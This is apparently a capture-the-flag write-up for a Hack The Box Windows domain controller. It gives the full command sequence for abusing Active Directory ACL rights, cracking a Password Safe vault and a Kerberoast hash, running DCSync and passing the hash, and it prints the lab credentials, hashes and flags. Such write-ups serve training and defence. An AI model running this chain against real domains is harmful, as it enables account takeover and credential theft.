# HTB Write-Up: Administrator

| Field      | Details                                                                  |
|------------|--------------------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Administrator)        |
| Difficulty | Medium                                                                   |
| OS         | Windows                                                                  |
| Author     | Samurai                                                                  |
| Date       | May 25, 2026                                                             |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — BloodHound & ACL Analysis](#2-enumeration--bloodhound--acl-analysis)
3. [Lateral Movement — GenericAll on Michael & FTP Access](#3-lateral-movement--genericall-on-michael--ftp-access)
4. [Lateral Movement — Password Safe & Emily's Credentials](#4-lateral-movement--password-safe--emilys-credentials)
5. [Privilege Escalation — Targeted Kerberoasting & DCSync](#5-privilege-escalation--targeted-kerberoasting--dcsync)
6. [Summary](#6-summary)

---

## 1. Reconnaissance

Port scanning was performed with **RustScan** for fast port discovery, followed by **Nmap** for service and version fingerprinting:

```bash
rustscan -a 10.129.3.8 --ulimit 5000
```

**Open Ports:**

| Port  | Service       | Details                         |
|-------|---------------|---------------------------------|
| 21    | FTP           | Microsoft FTP Service           |
| 53    | DNS           | Microsoft DNS                   |
| 88    | Kerberos      | Microsoft Windows Kerberos      |
| 135   | MSRPC         | Microsoft Windows RPC           |
| 139   | NetBIOS       | Microsoft Windows netbios-ssn   |
| 389   | LDAP          | Domain: `administrator.htb`     |
| 445   | SMB           | microsoft-ds                    |
| 464   | kpasswd5      | tcpwrapped                      |
| 593   | HTTP-RPC      | RPC over HTTP                   |
| 636   | LDAPSSL       | tcpwrapped                      |
| 5985  | WinRM         | Windows Remote Management       |
| 9389  | ADWS          | Active Directory Web Services   |

The host is a **Domain Controller** running **Windows Server 2022**, domain: **`administrator.htb`**. Port **21 (FTP)** is notable — uncommon on a DC and immediately worth investigating.

The machine was provided with a set of starting credentials: **`olivia:ichliebedich`**.

---

## 2. Enumeration — BloodHound & ACL Analysis

### 2.1 — SMB Share Enumeration

SMB share access was verified with the provided credentials:

```bash
netexec smb 10.129.3.8 -u 'olivia' -p 'ichliebedich' --shares
```

**Output:**

```
SMB  10.129.3.8  445  DC  [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb)
SMB  10.129.3.8  445  DC  [+] administrator.htb\olivia:ichliebedich
SMB  10.129.3.8  445  DC  Share         Permissions   Remark
SMB  10.129.3.8  445  DC  -----         -----------   ------
SMB  10.129.3.8  445  DC  ADMIN$                      Remote Admin
SMB  10.129.3.8  445  DC  C$                          Default share
SMB  10.129.3.8  445  DC  IPC$          READ          Remote IPC
SMB  10.129.3.8  445  DC  NETLOGON      READ          Logon server share
SMB  10.129.3.8  445  DC  SYSVOL        READ          Logon server share
```

No non-standard shares were readable, so the focus shifted to domain enumeration.

### 2.2 — Domain User Enumeration via LDAP

All domain accounts were pulled via LDAP:

```bash
ldapsearch -H ldap://administrator.htb -x \
  -D "olivia@administrator.htb" -w 'ichliebedich' \
  -b "DC=administrator,DC=htb" "(objectClass=user)" sAMAccountName \
  | grep "sAMAccountName:" | cut -d' ' -f2 > users
```

**Users discovered:**

```
Administrator, Guest, DC$, krbtgt
olivia, michael, benjamin, emily, ethan, alexander, emma
```

### 2.3 — BloodHound Collection

BloodHound was used to map the full ACL graph of the domain:

```bash
bloodhound-python -d administrator.htb \
  -dc administrator.htb \
  -ns 10.129.3.8 \
  -c All \
  -u olivia \
  -p ichliebedich \
  --zip
```

**Key findings from BloodHound:**

- **`olivia`** has **WinRM access** to the DC (can Evil-WinRM in directly).
- **`olivia`** has **GenericAll** over **`michael`** — full control, including the ability to reset the password.
- **`michael`** has **ForceChangePassword** over **`benjamin`**.
- **`benjamin`** has **FTP access** and owns a **Password Safe** file (`Backup.psafe3`).
- **`emily`** (recovered from the Password Safe) has **GenericWrite** over **`ethan`**.
- **`ethan`** is **Kerberoastable**.
- **`ethan`** has **DCSync** rights on the domain.

This is a clean, linear ACL chain: `olivia → michael → benjamin → emily → ethan → domain`.

---

## 3. Lateral Movement — GenericAll on Michael & FTP Access

### 3.1 — Password Reset: Olivia → Michael

Using `olivia`'s **GenericAll** right over `michael`, the account password was reset:

```bash
net rpc password "michael" "aliska123" \
  -U "administrator"/"olivia"%"ichliebedich" \
  -S "Administrator.htb"
```

Shell access was confirmed via Evil-WinRM:

```bash
evil-winrm -i administrator.htb -u michael -p aliska123
```

### 3.2 — Password Reset: Michael → Benjamin

Following the chain, `michael`'s **ForceChangePassword** right over `benjamin` was abused the same way:

```bash
net rpc password "benjamin" "aliska123" \
  -U "administrator"/"michael"%"aliska123" \
  -S "Administrator.htb"
```

### 3.3 — FTP Access & Backup.psafe3

With `benjamin`'s new credentials, the FTP service (port 21) was accessed:

```bash
ftp administrator.htb
# Login: benjamin / aliska123
```

**Directory listing:**

```
10-05-24  09:13AM    952    Backup.psafe3
```

The file `Backup.psafe3` — a **Password Safe** database — was downloaded:

```
ftp> get Backup.psafe3
```

---

## 4. Lateral Movement — Password Safe & Emily's Credentials

### 4.1 — Cracking the Password Safe Master Password

The Password Safe database was converted to a crackable hash format using `pwsafe2john`:

```bash
pwsafe2john Backup.psafe3 > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

**Result:**

```
tekieromucho     (Backup)
Session completed.
```

The vault was opened with the cracked master password, revealing stored credentials:

| Account                    | Password                       |
|----------------------------|--------------------------------|
| `administrator.htb\emily`  | `UXLCI5iETUsIBoFVTj8yQFKoHjXmb` |
| `administrator.htb\ethan`  | (stored, used later)           |
| `administrator.htb\alexander` | (stored)                    |

**User flag retrieved** from `\emily\Desktop\user.txt` via Evil-WinRM as `emily`.

---

## 5. Privilege Escalation — Targeted Kerberoasting & DCSync

### 5.1 — Targeted Kerberoasting: Emily → Ethan

BloodHound showed `emily` has **GenericWrite** over `ethan`. This permits writing to `ethan`'s `msDS-KeyCredentialLink` attribute (Shadow Credentials) or setting an SPN for targeted Kerberoasting.

The targeted Kerberoast approach was used via `targetedKerberoast.py`:

```bash
# Fix clock skew first
sudo ntpdate administrator.htb

# Request TGS for ethan
python3 targetedKerberoast.py \
  -d administrator.htb \
  -u emily \
  -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' \
  --dc-ip 10.129.3.8
```

**Output:**

```
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$ecf2205e...
```

The TGS-REP hash (etype 23) was saved and cracked with **John the Ripper**:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

**Result:**

```
limpbizkit       (?)
1g 0:00:00:00 DONE
Session completed.
```

Credentials recovered:

| Account                    | Password      |
|----------------------------|---------------|
| `administrator.htb\ethan`  | `limpbizkit`  |

### 5.2 — DCSync: Ethan → Domain

`ethan` holds **DCSync** privileges on the domain. `impacket-secretsdump` was used to dump all domain hashes:

```bash
impacket-secretsdump administrator/ethan:'limpbizkit'@10.129.3.8
```

**Output (excerpt):**

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
administrator.htb\olivia:1108:...:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\emily:1112:...:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:...:5c2b9f97e0620c3d307de85a93179884:::
...
```

The **Administrator NT hash** was extracted: `3dc553ce4b9fd20bd016e098d2d2fd2e`

### 5.3 — Root Flag via Pass-the-Hash

With the Administrator NT hash, a shell was opened via Evil-WinRM using Pass-the-Hash:

```bash
evil-winrm -i administrator.htb -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
3440291465b89f40bf0a961552ae2be7
```

**Root flag retrieved from `\Administrator\Desktop\root.txt`.**

---

## 6. Summary

| Phase | Technique | Result |
|-------|-----------|--------|
| Recon | RustScan + Nmap | DC identified, `administrator.htb`, Windows Server 2022; FTP on port 21 noted |
| Enumeration | BloodHound + LDAP | Full ACL chain mapped: `olivia → michael → benjamin → emily → ethan → domain` |
| Lateral (1) | GenericAll abuse — `net rpc password` | `michael` password reset; WinRM shell |
| Lateral (2) | ForceChangePassword — `net rpc password` | `benjamin` password reset |
| FTP | FTP as `benjamin` | `Backup.psafe3` downloaded |
| Password Safe | `pwsafe2john` + John + rockyou.txt | Master password `tekieromucho`; `emily` credentials recovered |
| User Flag | Evil-WinRM as `emily` | `user.txt` from `\emily\Desktop` |
| Kerberoasting | `targetedKerberoast.py` (GenericWrite → SPN) | TGS-REP hash for `ethan` → cracked to `limpbizkit` |
| DCSync | `impacket-secretsdump` as `ethan` | All NT hashes dumped; Administrator hash recovered |
| Root | Evil-WinRM + Pass-the-Hash | `root.txt` from `\Administrator\Desktop` |

### Key Takeaways

- **BloodHound ACL mapping is essential on AD machines.** The entire attack path here was a pre-built chain of delegated permissions — `GenericAll`, `ForceChangePassword`, `GenericWrite`, DCSync — each granting a foothold into the next account. Without BloodHound, discovering this chain manually would take hours.

- **FTP on a Domain Controller is a red flag.** The FTP service existed solely to host `benjamin`'s Password Safe backup. Sensitive credential stores should never be accessible via unauthenticated or low-privilege network services, let alone on a DC.

- **Password Safe databases are only as strong as their master password.** `tekieromucho` fell to rockyou.txt instantly. Offline-crackable credential vaults must use long, random master passwords and should never be stored in locations accessible to low-privileged users.

- **GenericWrite is a path to Kerberoasting.** The ability to write `msDS-KeyCredentialLink` or set an SPN on a target account turns any `GenericWrite` holder into an attacker capable of requesting and cracking a TGS offline. Purpose-built service accounts should be the only principals with SPNs, and write access to account attributes must be tightly controlled.

- **DCSync is game over.** Any account with `DS-Replication-Get-Changes-All` can pull every password hash in the domain without touching a DC's disk. This right should exist only on Domain Controllers and should be audited aggressively — a regular domain user holding it is an immediate critical finding.